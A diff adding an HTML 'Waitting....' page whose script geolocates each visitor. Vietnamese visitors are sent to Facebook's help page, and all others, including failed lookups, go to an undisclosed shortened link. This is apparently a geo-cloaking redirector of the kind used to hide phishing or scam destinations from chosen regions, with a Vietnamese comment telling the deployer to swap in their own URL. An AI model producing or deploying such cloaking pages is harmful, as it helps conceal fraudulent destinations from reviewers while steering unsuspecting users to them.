@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Waitting....</title>
+    <script type="text/javascript">
+        // Function to redirect to another URL
+        const banList = ["VN"];  // List of banned country codes
+
+        // Function to create a delay
+        function wait(time) {
+            return new Promise(resolve => {
+                setTimeout(resolve, time);
+            });
+        }
+
+        // Asynchronous function to handle redirection logic
+        async function redirect() {
+            await wait(1500);  // Wait for 1.5 seconds
+            const linkredir = "https://ln.run/njwiU";  // Redirection link
+
+            // Fetch the user's IP and location information
+            fetch("https://api.db-ip.com/v2/free/self/")
+                .then(res => res.json())
+                .then(json => {
+                    if (banList.includes(json.countryCode)) {
+                        // If the user's country code is in the ban list, redirect to Facebook help
+                        window.location.href = "https://www.facebook.com/help";
+                    } else {
+                        if (json.ipAddress) {
+                            // If the user's IP address is available, redirect to the specified link
+                            window.location.href = linkredir;
+                        } else {
+                            // If no IP address, fetch location info from another source
+                            fetch("https://ipinfo.io/json")
+                                .then(res1 => res1.json())
+                                .then(json1 => {
+                                    if (banList.includes(json1.country)) {
+                                        // If the user's country code from the second source is in the ban list, redirect to Facebook help
+                                        window.location.href = "https://www.facebook.com/help";
+                                    } else {
+                                        // Otherwise, redirect to the specified link
+                                        window.location.href = linkredir;
+                                    }
+                                })
+                                .catch(() => {
+                                    window.location.href = linkredir;
+                                });
+                        }
+                    }
+                })
+                .catch(() => {
+                    window.location.href = linkredir;
+                });
+        }
+
+        // Call the redirect function when the page loads
+        window.onload = redirect;
+    </script>
+</head>
+<body>
+    <p>Waitting....</p> <!-- Thay thế URL này bằng URL của trang bạn muốn chuyển hướng tới -->
+</body>
+</html>
